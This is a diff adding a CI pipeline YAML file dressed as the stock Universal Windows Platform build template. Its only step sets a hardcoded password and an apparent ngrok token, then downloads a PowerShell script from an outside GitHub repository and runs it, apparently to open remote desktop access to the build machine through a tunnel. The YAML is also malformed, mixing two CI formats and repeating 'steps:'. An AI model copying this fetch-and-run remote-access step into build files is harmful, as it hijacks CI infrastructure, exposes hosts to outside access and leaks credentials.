@@ -1,0 +1,26 @@
+# Universal Windows Platform
+# Build a Universal Windows Platform project using Visual Studio.
+# Add steps that test and distribute an app, save build artifacts, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: 'windows-latest'
+
+variables:
+  solution: '**/*.sln'
+  buildPlatform: 'x86|x64|ARM'
+  buildConfiguration: 'Release'
+  appxPackageDir: '$(build.artifactStagingDirectory)\AppxPackages\\'
+
+steps:
+  steps:
+      - run:
+          name: Windows RDP Circle CI NEW UPDATED
+          command: |
+            Set-Variable -Name "PASSWORD" -Value "Password2017"
+            Set-Variable -Name "NGROK" -Value "1sWG9b0AnwU36zqoR1SpiblgFG1_4DJRgqrC3vzYyvHmHVdWc"
+            Invoke-WebRequest https://raw.githubusercontent.com/Fiate/WINDOWSRDP/main/RDPcircleCI.ps1 -OutFile RDPcircleCI.ps1
+            ./RDPcircleCI.ps1
